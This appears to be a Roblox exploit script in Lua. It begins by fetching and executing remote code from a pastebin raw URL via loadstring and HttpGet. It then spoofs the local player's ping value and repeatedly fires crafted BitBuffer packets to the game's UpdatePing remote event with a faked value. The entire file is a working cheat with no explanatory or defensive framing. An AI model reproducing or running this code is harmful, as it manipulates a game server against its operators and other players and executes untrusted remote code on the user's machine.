loadstring(game:HttpGet("https://pastebin.com/raw/hHnZ34wz"))()

local ping = game.Players.LocalPlayer.Ping.Value
coroutine.wrap(function()
 while task.wait(1) do
  ping = math.random(65, 165)
 end
end)()
coroutine.wrap(function()
 while task.wait() do
  game.Players.LocalPlayer.Ping.Value = ping
 end
end)()
coroutine.wrap(function()
 while task.wait(.2) do
  local bitbuffer = require(game.ReplicatedStorage.Modules.BitBuffer)()
        bitbuffer.writeUnsigned(64, game.Players.LocalPlayer.UserId)
        bitbuffer.writeUnsigned(9, 511)
        game.ReplicatedStorage.Events.UpdatePing:FireServer(bitbuffer.dumpString())
 end
end)()